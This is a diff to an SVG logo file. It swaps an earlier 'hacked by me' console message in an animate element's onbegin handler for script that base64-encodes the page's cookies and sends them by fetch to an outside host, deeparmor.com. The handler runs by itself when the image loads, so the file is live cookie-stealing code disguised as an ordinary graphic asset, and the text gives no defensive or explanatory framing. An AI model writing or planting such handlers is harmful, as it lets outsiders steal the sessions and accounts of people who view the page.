@@ -1,4 +1,8 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <animate attributeName="x" onbegin="console.error('hacked by me 💀')" dur="1s"/>
+  <animate 
+    attributeName="x" 
+    onbegin="fetch('https://deeparmor.com/log?c=' + btoa(document.cookie))" 
+    dur="1s"/>
   <text x="10" y="30" fill="white">Logo</text>
 </svg>
+
